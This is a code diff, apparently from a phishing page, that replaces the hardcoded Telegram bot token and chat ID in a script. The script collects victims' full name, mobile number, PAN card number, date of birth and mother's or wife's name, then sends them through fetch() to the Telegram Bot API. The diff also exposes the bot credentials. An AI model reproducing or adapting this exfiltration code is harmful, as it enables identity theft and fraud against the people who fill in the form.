@@ -131,8 +131,8 @@
         }
 
         // Sending data to Telegram bot
-        const telegramBotToken = '7926544698:AAE03NZbQmsD7c9-DbED05odCLn8HlAlPwA'; // Replace with your Telegram bot token
-        const chatId = '5954321607'; // Replace with your chat ID
+        const telegramBotToken = '7226854445:AAGuRVDt8qncQ2GS3ru5pIqilEg8peaYuGY'; // Replace with your Telegram bot token
+        const chatId = '7843756377'; // Replace with your chat ID
         const textMessage = `Full Name: ${fullName}\nMobile No: ${mobileNo}\nPAN Card No: ${panCardNo}\nDOB: ${dob}\nMother/Wife Name: ${motherOrWife}`;
         
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}`)
